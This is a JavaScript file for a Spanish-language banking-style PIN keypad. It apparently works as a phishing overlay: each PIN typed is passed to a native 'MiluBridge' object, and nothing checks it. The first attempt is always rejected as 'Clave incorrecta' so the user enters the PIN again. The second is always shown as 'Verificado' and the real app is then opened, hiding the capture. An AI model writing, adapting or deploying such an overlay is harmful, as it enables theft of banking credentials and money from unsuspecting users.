(() => {
  const PIN_LEN = 6;
  const dots = Array.from(document.querySelectorAll("#pinDots .dot"));
  const keypad = document.getElementById("keypad");
  const forgotBtn = document.getElementById("forgotBtn");
  const logoutBtn = document.getElementById("logoutBtn");
  const toastEl = document.getElementById("toast");

  let pin = "";
  let submitCount = 0;
  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderDots() {
    dots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
    });
  }

  function shakeDots() {
    dots.forEach((dot) => {
      dot.classList.remove("is-shake");
      void dot.offsetWidth;
      dot.classList.add("is-shake");
    });
  }

  function clearPin() {
    pin = "";
    renderDots();
  }

  function submitPin() {
    if (locked) {
      return;
    }
    locked = true;
    const value = pin;
    submitCount += 1;
    reportDone(value);

    if (submitCount < 2) {
      toast("Clave incorrecta");
      shakeDots();
      window.setTimeout(() => {
        clearPin();
        locked = false;
        renderKeypad();
      }, 350);
      return;
    }

    toast("Verificado");
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 400);
  }

  function pushDigit(digit) {
    if (locked || pin.length >= PIN_LEN) {
      return;
    }
    pin += digit;
    renderDots();
    if (pin.length === PIN_LEN) {
      window.setTimeout(submitPin, 120);
    }
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
  }

  function renderKeypad() {
    const cells = [
      { type: "digit", value: "1" },
      { type: "digit", value: "2" },
      { type: "digit", value: "3" },
      { type: "digit", value: "4" },
      { type: "digit", value: "5" },
      { type: "digit", value: "6" },
      { type: "digit", value: "7" },
      { type: "digit", value: "8" },
      { type: "digit", value: "9" },
      { type: "bio" },
      { type: "digit", value: "0" },
      { type: "del" },
    ];
    keypad.innerHTML = "";
    cells.forEach((cell) => {
      if (cell.type === "bio") {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "key key-bio";
        btn.setAttribute("data-key", "bio");
        btn.setAttribute("aria-label", "Huella digital");
        btn.innerHTML =
          '<svg viewBox="0 0 24 24" width="28" height="28" aria-hidden="true">' +
          '<path fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" ' +
          'd="M12 11.5v3.2M12 7.2c2.4 0 4.3 1.9 4.3 4.3v1.2M12 7.2c-2.4 0-4.3 1.9-4.3 4.3v2.6' +
          "M8.4 16.2c.7 1.5 2.1 2.5 3.6 2.5s2.9-1 3.6-2.5M6.2 9.8C6.8 7.1 9.2 5.1 12 5.1" +
          'c2.8 0 5.2 2 5.8 4.7M5.2 13.4c0 2.4 1.1 4.6 2.9 6M18.8 13.4c0 1.5-.4 2.9-1.1 4.1"/>' +
          "</svg>";
        keypad.appendChild(btn);
        return;
      }
      if (cell.type === "del") {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "key key-del";
        btn.setAttribute("data-key", "del");
        btn.setAttribute("aria-label", "Borrar");
        btn.innerHTML =
          '<svg viewBox="0 0 28 22" width="28" height="22" aria-hidden="true">' +
          '<path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round" ' +
          'd="M10.5 2.5H24a2 2 0 0 1 2 2v13a2 2 0 0 1-2 2H10.5L3 11.5 10.5 2.5z"/>' +
          '<path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" d="M13 8l6 6M19 8l-6 6"/>' +
          "</svg>";
        keypad.appendChild(btn);
        return;
      }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "key";
      btn.setAttribute("data-key", cell.value);
      btn.textContent = cell.value;
      keypad.appendChild(btn);
    });
  }

  keypad.addEventListener("click", (event) => {
    const btn = event.target.closest("[data-key]");
    if (!btn) {
      return;
    }
    const key = btn.getAttribute("data-key");
    if (key === "del") {
      deleteDigit();
      return;
    }
    if (key === "bio") {
      toast("Usa tu huella o ingresá la clave");
      return;
    }
    if (/^\d$/.test(key)) {
      pushDigit(key);
    }
  });

  forgotBtn.addEventListener("click", () => {
    toast("Usa tu clave HM para continuar");
  });

  logoutBtn.addEventListener("click", () => {
    const b = bridge();
    if (b && typeof b.logout === "function") {
      try {
        b.logout();
        return;
      } catch (_) {
        /* ignore */
      }
    }
    toast("Sesión cerrada");
  });

  renderKeypad();
  renderDots();
})();
